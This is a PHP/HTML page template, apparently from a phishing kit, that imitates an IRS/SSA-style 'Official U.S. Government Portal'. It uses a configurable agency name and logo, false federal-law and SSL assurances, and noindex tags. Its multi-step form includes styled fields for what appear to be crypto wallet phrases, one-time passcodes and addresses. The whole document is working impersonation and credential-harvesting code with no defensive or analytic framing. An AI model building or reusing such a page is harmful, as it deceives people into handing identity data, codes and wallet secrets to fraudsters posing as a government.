<?php
// Government template — IRS / SSA style: wide card, serif fonts, light/formal, numbered steps, official banner
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Secure Portal</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:ital,wght@0,400;0,600;0,700;1,400&family=Source+Sans+3:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Source Sans 3',Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#dde2ea;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:#1a2340}

/* Wide government card */
.card{width:100%;max-width:540px;background:#fff;border-radius:0;border:1px solid #b0bac5;box-shadow:0 2px 12px rgba(0,0,0,.12)}

/* Government banner */
.gov-banner{background:<?=$accent?>;padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:36px}
.gov-banner-text{font-size:11px;color:rgba(255,255,255,.9);font-weight:600;letter-spacing:.3px;text-transform:uppercase}
.gov-official{font-size:10px;color:rgba(255,255,255,.75)}

/* Header */
.hd{background:#fff;padding:20px 28px;display:flex;align-items:center;gap:18px;border-bottom:3px solid <?=$accent?>}
.logo-box{width:64px;height:64px;background:<?=$logo_bg?>;border:1px solid #d0d5dd;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:800;color:<?=$accent?>}
.hd-text{}
.hd-name{font-size:17px;font-weight:700;color:#1a2340;font-family:'Source Serif 4',Georgia,serif;line-height:1.2}
.hd-sub{font-size:11px;color:#6b7280;margin-top:3px;text-transform:uppercase;letter-spacing:.4px}
.hd-meta{font-size:10px;color:#9ca3af;margin-top:6px;display:flex;gap:16px}

/* Notice box */
.notice-box{margin:0;padding:10px 28px;background:#fffbf0;border-bottom:1px solid #f3d766;display:flex;align-items:flex-start;gap:10px}
.notice-icon{font-size:14px;margin-top:1px;flex-shrink:0}
.notice-text{font-size:12px;color:#78620a;line-height:1.5;font-style:italic}
.notice-strong{font-weight:700;font-style:normal;text-transform:uppercase;letter-spacing:.3px}

/* Step indicator — numbered */
.step-nums{display:flex;gap:0;margin:0}
.step-num-item{flex:1;display:flex;flex-direction:column;align-items:center;padding:12px 8px;background:#f4f6f9;border-right:1px solid #dde2ea;position:relative}
.step-num-item:last-child{border-right:none}
.step-num-item.active{background:#fff;border-bottom:3px solid <?=$accent?>}
.step-num-item.done{background:#f4f6f9;border-bottom:3px solid <?=$sec?>}
.step-num-circle{width:24px;height:24px;border-radius:50%;background:<?=$accent?>;color:#fff;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-bottom:4px}
.step-num-item.done .step-num-circle{background:<?=$sec?>}
.step-num-item:not(.active):not(.done) .step-num-circle{background:#d1d5db;color:#6b7280}
.step-num-label{font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:.4px;text-align:center;line-height:1.3}
.step-num-item.active .step-num-label{color:<?=$accent?>;font-weight:700}

/* Body */
.bd{padding:24px 28px 20px}
.step-title{font-size:18px;font-weight:700;color:#1a2340;font-family:'Source Serif 4',Georgia,serif;margin-bottom:4px;line-height:1.3}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#374151;font-weight:600;letter-spacing:.2px;margin-bottom:5px}
.field input{width:100%;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:0;font-size:14px;outline:none;transition:border-color .2s,box-shadow .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12);background:#fff}
.field input::placeholder{color:#9ca3af}
.or-div{text-align:center;font-size:11px;color:#9ca3af;margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:44%;height:1px;background:#e5e7eb}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:13px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;border:none;border-radius:0;cursor:pointer;margin-top:8px;letter-spacing:.3px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.1)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#b91c1c;margin-top:8px;display:none}
.security-note{display:flex;align-items:center;gap:6px;font-size:11px;color:#9ca3af;margin-top:14px;padding-top:12px;border-top:1px solid #e5e7eb}
.wallet-area{width:100%;min-height:80px;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:0;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9ca3af;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:20px;font-weight:700;padding:12px 4px;max-width:48px;background:#fafafa;border:1px solid #d1d5db;border-radius:0;color:#1a2340;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9ca3af;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:#fafafa;border:1px solid #d1d5db;color:#1a2340;padding:11px 13px;border-radius:0;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:14px 24px;background:#f4f6f9;border-top:1px solid #d1d5db;font-size:10px;color:#9ca3af;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.9);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#6b7280}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .card{min-height:100vh;min-height:100dvh;border:none;box-shadow:none}
  .bd{padding:20px 18px 16px}
  .hd{padding:16px 18px}
  .gov-banner,.notice-box{padding-left:18px;padding-right:18px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Processing your information…</div></div>

<div class="card">
  <div class="gov-banner">
    <span class="gov-banner-text">🇺🇸 Official U.S. Government Portal</span>
    <span class="gov-official"><?=$today?></span>
  </div>

  <div class="hd">
    <div class="logo-box">
      <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
      <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
    </div>
    <div class="hd-text">
      <div class="hd-name"><?=$org_name?></div>
      <div class="hd-sub"><?=$org_sub?></div>
      <div class="hd-meta">
        <span>Ref: <?=htmlspecialchars($ref_code)?></span>
        <span>🔒 Secure Portal</span>
      </div>
    </div>
  </div>

  <div class="notice-box">
    <span class="notice-icon">⚠️</span>
    <div class="notice-text"><span class="notice-strong">Official Government Notice</span> — This secure portal requires identity verification. Your information is protected under federal law.</div>
  </div>

  <div class="step-nums" id="stepDots">
    <?php for($i=1;$i<=$total_steps;$i++): ?>
    <div class="step-num-item <?=$i===1?'active':''?>" id="d<?=$i?>">
      <div class="step-num-circle"><?=$i?></div>
      <div class="step-num-label">Step <?=$i?></div>
    </div>
    <?php endfor; ?>
  </div>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please complete all required fields.</div>
      </form>
      <div class="security-note">🔒 256-bit SSL Encrypted &middot; Protected by federal law</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=$footer?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Override showStep to update numbered step indicator
const _origShowG = showStep;
function showStep(n) {
    _origShowG(n);
    for (let i = 1; i <= TOTAL_STEPS; i++) {
        const el = document.getElementById('d'+i);
        if (!el) continue;
        el.className = 'step-num-item' + (i < n ? ' done' : i === n ? ' active' : '');
    }
}
</script>
</body>
</html>
